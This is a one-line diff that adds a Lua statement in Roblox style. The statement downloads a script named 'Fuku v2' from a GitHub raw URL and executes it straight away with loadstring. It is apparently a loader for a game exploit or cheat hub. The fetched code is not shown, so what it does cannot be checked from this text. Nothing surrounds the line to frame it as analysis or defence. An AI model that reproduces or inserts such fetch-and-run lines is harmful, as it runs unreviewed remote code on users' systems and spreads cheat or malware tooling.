@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/fukuv1111/Fuku-v2/main/Fuku%20v2"))()
